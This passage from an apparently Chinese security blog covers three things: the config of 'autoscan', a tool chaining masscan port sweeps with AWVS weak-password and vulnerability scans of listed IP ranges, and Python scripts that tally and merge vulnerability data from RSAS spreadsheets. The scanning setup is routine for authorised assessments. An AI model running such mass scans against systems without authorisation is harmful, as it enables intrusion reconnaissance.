class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">│  autoscan.exe           主程序</span><br><span class="line">│  autoscan.ini           配置文件</span><br><span class="line">│  masscan.exe            masscan</span><br><span class="line">└─ 必装环境                必须安装的环境</span><br><span class="line">        vcredist_x64.exe</span><br><span class="line">        vcredist_x86.exe</span><br><span class="line">        WinPcap_4_1_2.exe</span><br></pre></td></tr></table></figure><p>安装好环境之后只需要：<br>修改配置文件、新建资产即可。</p><p>1、 修改配置文件（autoscan.ini）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">thread :         线程，不建议过大，一是丢包严重，二是可能会造成masscan假死</span><br><span class="line">posts :          扫描的端口范围，默认：1-65535</span><br><span class="line">arguments :      发包速率，默认：--rete 10000</span><br><span class="line">awvs :           AWVS11的IP和端口，空格隔开：192.168.254.128 3443</span><br><span class="line">api :            AWVS11的API</span><br><span class="line">scanmode :       扫描模式（默认弱口令）：11111111-1111-1111-1111-111111111115</span><br></pre></td></tr></table></figure><p>这个脚本是AWVS11的，AWVS12还没测试，几种扫描模式如下：</p><table><thead><tr><th align="left">类型</th><th align="left">值</th></tr></thead><tbody><tr><td align="left">Full Scan</td><td align="left">11111111-1111-1111-1111-111111111111</td></tr><tr><td align="left">High Risk Vulnerabilities</td><td align="left">11111111-1111-1111-1111-111111111112</td></tr><tr><td align="left">Cross-site Scripting Vulnerabilities</td><td align="left">11111111-1111-1111-1111-111111111116</td></tr><tr><td align="left">SQL Injection Vulnerabilities</td><td align="left">11111111-1111-1111-1111-111111111113</td></tr><tr><td align="left">Weak Passwords</td><td align="left">11111111-1111-1111-1111-111111111115</td></tr><tr><td align="left">Crawl Only</td><td align="left">11111111-1111-1111-1111-111111111117</td></tr></tbody></table><p>2、 资产文件：<br>在同目录下新建文件assets.txt，把IP保存到文件中，一个一行，支持IP，IP段。启动autoscan.exe即可开始扫描，数据会保存在autoscan.db这个数据库文件中。</p><h4 id="0×02-其他"><a href="#0×02-其他" class="headerlink" title="0×02 其他"></a>0×02 其他</h4><p>1、autoscan.db数据库表详解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">host：保存端口探测的结果</span><br><span class="line">web：保存web探测的结果</span><br><span class="line">assets：保存资产，扫完之后会删除</span><br></pre></td></tr></table></figure><p>2、其他</p><p>关闭软件后，重新打开即可继续上一次探测。</p><p>关闭软件后，新建文件assets.txt，把新的IP保存到文件中，重新打开软件会导入新的资产IP，然后继续上一次扫描。</p><h4 id="0×03-下载链接"><a href="#0×03-下载链接" class="headerlink" title="0×03 下载链接"></a>0×03 下载链接</h4><p>下载地址随缘。</p><h3 id="第二款扫描器"><a href="#第二款扫描器" class="headerlink" title="第二款扫描器"></a>第二款扫描器</h3><p>嗯，这是一款只听说过，但是不会流传出来的一款全自动漏洞扫描器，目前正在实现。</p>]]></content>
      
      
      <categories>
          
          <category> 原创工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python RSAS统计已经整改的漏洞数据</title>
      <link href="/article/refuse-rsas-count.html"/>
      <url>/article/refuse-rsas-count.html</url>
      
        <content type="html"><![CDATA[<p>搞不动了，是时候研究数据分析了…</p><p>食用方法：<br>count_leak.py C:\要统计的数据文件夹，文件夹下是RSAS导出来的漏洞跟踪表</p><p>效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">中国测试平台</span><br><span class="line">6月     漏洞高风险整改数：418   漏洞高风险备案数：0     漏洞中风险整改数：1110  漏洞中风险备案数：0 渗透高风险整改数：3 渗透中风险整改数：39    渗透中风险备案数：0     渗透低风险整改数：2     弱口令高风险整改数：1</span><br><span class="line">7月     漏洞高风险整改数：0     漏洞高风险备案数：0     漏洞中风险整改数：24    漏洞中风险备案数：0 渗透高风险整改数：0 渗透中风险整改数：0     渗透中风险备案数：0     渗透低风险整改数：0     弱口令高风险整改数：0</span><br><span class="line">8月     漏洞高风险整改数：0     漏洞高风险备案数：0     漏洞中风险整改数：6     漏洞中风险备案数：0 渗透高风险整改数：0 渗透中风险整改数：0     渗透中风险备案数：0     渗透低风险整改数：0     弱口令高风险整改数：0</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from openpyxl import load_workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取输入的路径</span><br><span class="line">count_folder = sys.argv[1]</span><br><span class="line"># 获取路径下的文件，返回列表</span><br><span class="line">count_list = os.listdir(count_folder)</span><br><span class="line"># 迭代这些该死的文件</span><br><span class="line">for count_name in count_list:</span><br><span class="line">    system_name = count_name.replace(&apos;合并-&apos;,&apos;&apos;).split(&apos;-&apos;)[2].split(&apos;.&apos;)[0].replace(&apos; &apos;,&apos;&apos;)</span><br><span class="line">    # 打开这个该死的文件</span><br><span class="line">    wb = load_workbook(count_folder + &apos;/&apos; + count_name.strip(&apos;\n\r&apos;))</span><br><span class="line">    ws = wb.active</span><br><span class="line"></span><br><span class="line">    leak_list = []</span><br><span class="line">    test_list = []</span><br><span class="line">    weak_list = []</span><br><span class="line">    month = []</span><br><span class="line"></span><br><span class="line">    #读取Excel所有行，并迭代</span><br><span class="line">    for cent in ws.rows:</span><br><span class="line">        # 漏洞在第四行，所以i大于等于4</span><br><span class="line">        if cent[15].value == &apos;已完成整改&apos;:</span><br><span class="line">            if cent[6].value == &apos;漏洞&apos;:</span><br><span class="line">                # 分别代表风险等级、月份、备注</span><br><span class="line">                leak_list.append([cent[7].value,cent[12].value,cent[17].value])</span><br><span class="line">            if cent[6].value == &apos;渗透&apos;:</span><br><span class="line">                # 分别代表风险等级、月份、备注</span><br><span class="line">                test_list.append([cent[7].value,cent[12].value,cent[17].value])</span><br><span class="line">            if cent[6].value == &apos;弱口令&apos;:</span><br><span class="line">                # 分别代表风险等级、月份、备注</span><br><span class="line">                weak_list.append([cent[7].value,cent[12].value,cent[17].value])</span><br><span class="line">            month.append(cent[12].value)</span><br><span class="line"></span><br><span class="line">    # 月份去重后保持原来的顺序</span><br><span class="line">    month_list = list(set(month))</span><br><span class="line">    month_list.sort(key = month.index)</span><br><span class="line"></span><br><span class="line">    if len(month_list) == 0:</span><br><span class="line">        pass</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;\n&apos; + system_name)</span><br><span class="line"></span><br><span class="line">    for number in month_list:</span><br><span class="line">        # 漏洞数据</span><br><span class="line">        leak_case_high = 0</span><br><span class="line">        leak_case_middle = 0</span><br><span class="line">        leak_rectification_high = 0</span><br><span class="line">        leak_rectification_middle = 0</span><br><span class="line">        for leak in leak_list:</span><br><span class="line">            if leak[0] == &apos;高&apos; and leak[1] == number and leak[2] == None:</span><br><span class="line">                leak_rectification_high += 1</span><br><span class="line">            if leak[0] == &apos;中&apos; and leak[1] == number and leak[2] == None:</span><br><span class="line">                leak_rectification_middle += 1</span><br><span class="line"></span><br><span class="line">            if leak[0] == &apos;高&apos; and leak[1] == number and leak[2] == &apos;备案&apos;:</span><br><span class="line">                leak_case_high += 1</span><br><span class="line">            if leak[0] == &apos;中&apos; and leak[1] == number and leak[2] == &apos;备案&apos;:</span><br><span class="line">                leak_case_middle += 1</span><br><span class="line"></span><br><span class="line">        # 渗透数据</span><br><span class="line">        test_high = 0</span><br><span class="line">        test_low = 0</span><br><span class="line">        test_case_middle = 0</span><br><span class="line">        test_rectification_middle = 0</span><br><span class="line">        for test in test_list:</span><br><span class="line">            if test[0] == &apos;高&apos; and test[1] == number:</span><br><span class="line">                test_high += 1</span><br><span class="line">            if test[0] == &apos;低&apos; and test[1] == number:</span><br><span class="line">                test_low += 1</span><br><span class="line"></span><br><span class="line">            if test[0] == &apos;中&apos; and test[1] == number and test[2] == None:</span><br><span class="line">                test_rectification_middle += 1</span><br><span class="line">            if test[0] == &apos;中&apos; and test[1] == number and test[2] == &apos;备案&apos;:</span><br><span class="line">                test_case_middle += 1</span><br><span class="line"></span><br><span class="line">        # 弱口令数据</span><br><span class="line">        weak_high = 0</span><br><span class="line">        for weak in weak_list:</span><br><span class="line">            if weak[0] == &apos;高&apos; and weak[1] == number:</span><br><span class="line">                weak_high += 1</span><br><span class="line"></span><br><span class="line">        print(number + &apos;\t漏洞高风险整改数：%s\t漏洞高风险备案数：%s\t漏洞中风险整改数：%s\t漏洞中风险备案数：%s\t渗透高风险整改数：%s\t渗透中风险整改数：%s\t渗透中风险备案数：%s\t渗透低风险整改数：%s\t弱口令高风险整改数：%s\t&apos; % (leak_rectification_high,leak_case_high,leak_rectification_middle,leak_case_middle,test_high,test_rectification_middle,test_case_middle,test_low,weak_high))</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 回收站 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python RSAS添加新增漏洞数据</title>
      <link href="/article/refuse-add-leak.html"/>
      <url>/article/refuse-add-leak.html</url>
      
        <content type="html"><![CDATA[<p>配合漏洞导出工具使用，执行这一个神奇的脚本，会提升99%的工作效率。</p><p>干嘛用的？<br>如果每个月都要进行扫描，并且要筛选出新增的漏洞，Excel一个一个的对比太麻烦了，一个完整的漏洞管理又没时间搞，所以！</p><p>食用方法：</p><p>add_leak.py 原始漏洞数据 扫描新增漏洞数据 月份<br>add_leak.py C:\旧数据文件夹 C:\新数据文件夹 8</p><h3 id="2018年8月27日"><a href="#2018年8月27日" class="headerlink" title="2018年8月27日"></a>2018年8月27日</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from openpyxl.styles import Border, Side</span><br><span class="line">from openpyxl.styles import Alignment</span><br><span class="line">from openpyxl.styles import NamedStyle</span><br><span class="line">from openpyxl.styles import Font</span><br><span class="line">from openpyxl import load_workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_folder = sys.argv[1]</span><br><span class="line">add_folder = sys.argv[2]</span><br><span class="line">month = sys.argv[3] + &apos;月&apos;</span><br><span class="line"></span><br><span class="line">system_name = []</span><br><span class="line"></span><br><span class="line">oldList = os.listdir(old_folder)</span><br><span class="line">addList = os.listdir(add_folder)</span><br><span class="line"></span><br><span class="line">for old_name in oldList:</span><br><span class="line">    userd = old_name</span><br><span class="line">    old_name = old_name.replace(&apos;合并-&apos;,&apos;&apos;).split(&apos;-&apos;)[2].split(&apos;.&apos;)[0].replace(&apos; &apos;,&apos;&apos;)</span><br><span class="line">    for add_name in addList:</span><br><span class="line">        new = add_name</span><br><span class="line">        add_name = add_name.split(&apos;-&apos;)[2].split(&apos;.&apos;)[0].replace(&apos; &apos;,&apos;&apos;)</span><br><span class="line">        if add_name == old_name:</span><br><span class="line">            #调试使用</span><br><span class="line">            # print(old_folder + &apos;/&apos; + userd.strip(&apos;\n\r&apos;))</span><br><span class="line">            # print(add_folder + &apos;/&apos; + new.strip(&apos;\n\r&apos;))</span><br><span class="line"></span><br><span class="line">            old_wb = load_workbook(old_folder + &apos;/&apos; + userd.strip(&apos;\n\r&apos;))</span><br><span class="line">            old_ws = old_wb.active</span><br><span class="line"></span><br><span class="line">            add_wb = load_workbook(add_folder + &apos;/&apos; + new.strip(&apos;\n\r&apos;))</span><br><span class="line">            add_ws = add_wb.active</span><br><span class="line"></span><br><span class="line">            thin = Side(border_style=&quot;thin&quot;, color=&quot;000000&quot;)</span><br><span class="line">            font = Font(bold=True, size=12)</span><br><span class="line">            add_font = Font(size=10)</span><br><span class="line">            border = Border(left=thin, right=thin, top=thin, bottom=thin)</span><br><span class="line">            alignment = Alignment(horizontal=&apos;center&apos;, vertical=&apos;center&apos;, wrap_text=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            old_list = []</span><br><span class="line">            add_list = []</span><br><span class="line"></span><br><span class="line">            i = 1</span><br><span class="line">            #读取Excel所有行，并迭代</span><br><span class="line">            for old_row in old_ws.rows:</span><br><span class="line">                #漏洞在第四行，所以i大于等于4</span><br><span class="line">                if i &gt;= 4:</span><br><span class="line">                    #分别代表IP、漏洞名称、端口，和列表一样。</span><br><span class="line">                    old_list.append(&apos;%s%s%s&apos; % (old_row[2].value,old_row[5].value,old_row[3].value))</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">            num = i - 3</span><br><span class="line"></span><br><span class="line">            i = 1</span><br><span class="line">            for add_row in add_ws.rows:</span><br><span class="line">                if i &gt;= 4:</span><br><span class="line">                    #分别代表主机名、IP地址、漏洞对应端口、漏洞对应服务、漏洞名称、风险分类、风险等级、整改建议、漏洞描述、漏洞CVE编号、漏洞对应协议</span><br><span class="line">                    add_list.append([add_row[1].value,add_row[2].value,add_row[3].value,add_row[4].value,add_row[5].value,add_row[6].value,add_row[7].value,add_row[8].value,add_row[9].value,add_row[10].value,add_row[11].value])</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">            #迭代旧的漏洞数据表</span><br><span class="line">            height_list = []</span><br><span class="line">            low_list = []</span><br><span class="line">            for add in add_list:</span><br><span class="line">                unlock = 1</span><br><span class="line">                #迭代新的漏洞数据表</span><br><span class="line">                for old in old_list:</span><br><span class="line">                    #如果旧数据的 IP、漏洞、端口等于新的漏洞数据</span><br><span class="line">                    if &apos;%s%s%s&apos;%(add[1],add[4],add[2]) == old:</span><br><span class="line">                        unlock = 0</span><br><span class="line">                        break</span><br><span class="line">                if unlock == 1:</span><br><span class="line">                    #设置行高</span><br><span class="line">                    old_ws.row_dimensions[num + 3].height = 25</span><br><span class="line">                    #添加新增的漏洞数据</span><br><span class="line">                    old_ws.append([num,add[0],add[1],add[2],add[3],add[4],add[5],add[6],add[7],add[8],add[9],add[10],month])</span><br><span class="line">                    if add[6] == &apos;高&apos;:</span><br><span class="line">                        height_list.append(add[6])</span><br><span class="line">                    else:</span><br><span class="line">                        low_list.append(add[6])</span><br><span class="line"></span><br><span class="line">                    for line in old_ws[&apos;A%s:R%s&apos; % (num+3,num+3)]:</span><br><span class="line">                        for line_style in line:</span><br><span class="line">                            line_style.font = add_font</span><br><span class="line"></span><br><span class="line">                    num += 1</span><br><span class="line"></span><br><span class="line">            for line in old_ws[&apos;A1:R%s&apos; % (num+2)]:</span><br><span class="line">                for line_style in line:</span><br><span class="line">                    line_style.border = border</span><br><span class="line">                    line_style.alignment = alignment</span><br><span class="line"></span><br><span class="line">            i = 2</span><br><span class="line">            while True:</span><br><span class="line">                if old_ws[&apos;T%s&apos;%i].value == None:</span><br><span class="line">                    old_ws[&apos;T%s&apos;%i] = month</span><br><span class="line">                    old_ws[&apos;U%s&apos;%i].value = &apos;=COUNTIFS(H:H,&quot;高&quot;,M:M,T%s)&apos; % i</span><br><span class="line">                    old_ws[&apos;V%s&apos;%i].value = &apos;=COUNTIFS(H:H,&quot;中&quot;,M:M,T%s)&apos; % i</span><br><span class="line">                    old_ws[&apos;W%s&apos;%i].value = &apos;=COUNTIFS(H:H,&quot;高&quot;,M:M,T%s,P:P,&quot;已完成整改&quot;)&apos; % i</span><br><span class="line">                    old_ws[&apos;X%s&apos;%i].value = &apos;=COUNTIFS(H:H,&quot;中&quot;,M:M,T%s,P:P,&quot;已完成整改&quot;)&apos; % i</span><br><span class="line">                    old_ws[&apos;Y%s&apos;%i].value = &apos;=IF(U%s=0,&quot;无高风险漏洞&quot;,TEXT(W%s/U%s,&quot;0.00%%&quot;))&apos; % (i,i,i)</span><br><span class="line">                    old_ws[&apos;Z%s&apos;%i].value = &apos;=IF(V%s=0,&quot;无中风险漏洞&quot;,TEXT(X%s/V%s,&quot;0.00%%&quot;))&apos; % (i,i,i)</span><br><span class="line">                    old_ws[&apos;AA%s&apos;%i].value = &apos;=TEXT((W%s+X%s)/(U%s+V%s),&quot;0.00%%&quot;)&apos; % (i,i,i,i)</span><br><span class="line">                    for line in old_ws[&apos;T%s:AA%s&apos; % (i,i)]:</span><br><span class="line">                        for line_style in line:</span><br><span class="line">                            line_style.border = border</span><br><span class="line">                            line_style.font = font</span><br><span class="line">                            line_style.alignment = alignment</span><br><span class="line">                    break</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">            old_wb.save(old_folder + &apos;/&apos; + userd.strip(&apos;\n\r&apos;))</span><br><span class="line">            system_name.append(userd)</span><br><span class="line">            #openpyxl读取公式的值返回None 使用列表代替</span><br><span class="line">            print(&apos;新增高危：%s \t中危：%s  \t&apos; %(len(height_list),len(low_list)) + old_name.strip(&apos;\n\r&apos;))</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&apos;\n添加漏洞数据失败：&apos;)</span><br><span class="line">for old_name in oldList:</span><br><span class="line">    for name in system_name:</span><br><span class="line">        if old_name == name:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(old_name)</span><br></pre></td></tr></table></figure><hr><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from openpyxl.styles import Border, Side</span><br><span class="line">from openpyxl.styles import Alignment</span><br><span class="line">from openpyxl.styles import NamedStyle</span><br><span class="line">from openpyxl.styles import Font</span><br><span class="line">from openpyxl import load_workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_folder = sys.argv[1]</span><br><span class="line">add_folder = sys.argv[2]</span><br><span class="line">month = sys.argv[3] + &apos;月&apos;</span><br><span class="line"></span><br><span class="line">system_name = []</span><br><span class="line"></span><br><span class="line">oldList = os.listdir(old_folder)</span><br><span class="line">for old_name in oldList:</span><br><span class="line">    addList = os.listdir(add_folder)</span><br><span class="line">    for add_name in addList:</span><br><span class="line">        try:</span><br><span class="line">            name = add_name.split(&apos;区&apos;)[1].split(&apos;.&apos;)[0]</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&apos;添加漏洞数据失败：%s&apos;%old_name)</span><br><span class="line">        else:</span><br><span class="line">            if name in old_name:</span><br><span class="line"></span><br><span class="line">                #调试使用</span><br><span class="line">                # print(old_folder + &apos;/&apos; + old_name.strip(&apos;\n\r&apos;))</span><br><span class="line">                # print(add_folder + &apos;/&apos; + add_name.strip(&apos;\n\r&apos;))</span><br><span class="line"></span><br><span class="line">                old_wb = load_workbook(old_folder + &apos;/&apos; + old_name.strip(&apos;\n\r&apos;))</span><br><span class="line">                old_ws = old_wb.active</span><br><span class="line"></span><br><span class="line">                add_wb = load_workbook(add_folder + &apos;/&apos; + add_name.strip(&apos;\n\r&apos;))</span><br><span class="line">                add_ws = add_wb.active</span><br><span class="line"></span><br><span class="line">                thin = Side(border_style=&quot;thin&quot;, color=&quot;000000&quot;)</span><br><span class="line">                font = Font(bold=True, size=12)</span><br><span class="line">                add_font = Font(size=10)</span><br><span class="line">                border = Border(left=thin, right=thin, top=thin, bottom=thin)</span><br><span class="line">                alignment = Alignment(horizontal=&apos;center&apos;, vertical=&apos;center&apos;, wrap_text=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                old_list = []</span><br><span class="line">                add_list = []</span><br><span class="line"></span><br><span class="line">                i = 1</span><br><span class="line">                #读取Excel所有行，并迭代</span><br><span class="line">                for old_row in old_ws.rows:</span><br><span class="line">                    #漏洞在第四行，所以i大于等于4</span><br><span class="line">                    if i &gt;= 4:</span><br><span class="line">                        #分别代表IP、漏洞名称、端口，和列表一样。</span><br><span class="line">                        old_list.append(&apos;%s%s%s&apos; % (old_row[2].value,old_row[5].value,old_row[3].value))</span><br><span class="line">                    i += 1</span><br><span class="line"></span><br><span class="line">                num = i - 3</span><br><span class="line"></span><br><span class="line">                i = 1</span><br><span class="line">                for add_row in add_ws.rows:</span><br><span class="line">                    if i &gt;= 4:</span><br><span class="line">                        #分别代表主机名、IP地址、漏洞对应端口、漏洞对应服务、漏洞名称、风险分类、风险等级、整改建议、漏洞描述、漏洞CVE编号、漏洞对应协议</span><br><span class="line">                        add_list.append([add_row[1].value,add_row[2].value,add_row[3].value,add_row[4].value,add_row[5].value,add_row[6].value,add_row[7].value,add_row[8].value,add_row[9].value,add_row[10].value,add_row[11].value])</span><br><span class="line">                    i += 1</span><br><span class="line"></span><br><span class="line">                #迭代旧的漏洞数据表</span><br><span class="line">                height_list = []</span><br><span class="line">                low_list = []</span><br><span class="line">                for add in add_list:</span><br><span class="line">                    unlock = 1</span><br><span class="line">                    #迭代新的漏洞数据表</span><br><span class="line">                    for old in old_list:</span><br><span class="line">                        #如果旧数据的 IP、漏洞、端口等于新的漏洞数据</span><br><span class="line">                        if &apos;%s%s%s&apos;%(add[1],add[4],add[2]) == old:</span><br><span class="line">                            unlock = 0</span><br><span class="line">                            break</span><br><span class="line">                    if unlock == 1:</span><br><span class="line">                        #设置行高</span><br><span class="line">                        old_ws.row_dimensions[num + 3].height = 25</span><br><span class="line">                        #添加新增的漏洞数据</span><br><span class="line">                        old_ws.append([num,add[0],add[1],add[2],add[3],add[4],add[5],add[6],add[7],add[8],add[9],add[10],month])</span><br><span class="line">                        if add[6] == &apos;高&apos;:</span><br><span class="line">                            height_list.append(add[6])</span><br><span class="line">                        else:</span><br><span class="line">                            low_list.append(add[6])</span><br><span class="line"></span><br><span class="line">                        for line in old_ws[&apos;A%s:R%s&apos; % (num+3,num+3)]:</span><br><span class="line">                            for line_style in line:</span><br><span class="line">                                line_style.font = add_font</span><br><span class="line"></span><br><span class="line">                        num += 1</span><br><span class="line"></span><br><span class="line">                for line in old_ws[&apos;A1:R%s&apos; % (num+2)]:</span><br><span class="line">                    for line_style in line:</span><br><span class="line">                        line_style.border = border</span><br><span class="line">                        line_style.alignment = alignment</span><br><span class="line"></span><br><span class="line">                i = 2</span><br><span class="line">                while True:</span><br><span class="line">                    if old_ws[&apos;T%s&apos;%i].value == None:</span><br><span class="line">                        old_ws[&apos;T%s&apos;%i] = month</span><br><span class="line">                        old_ws[&apos;U%s&apos;%i].value = 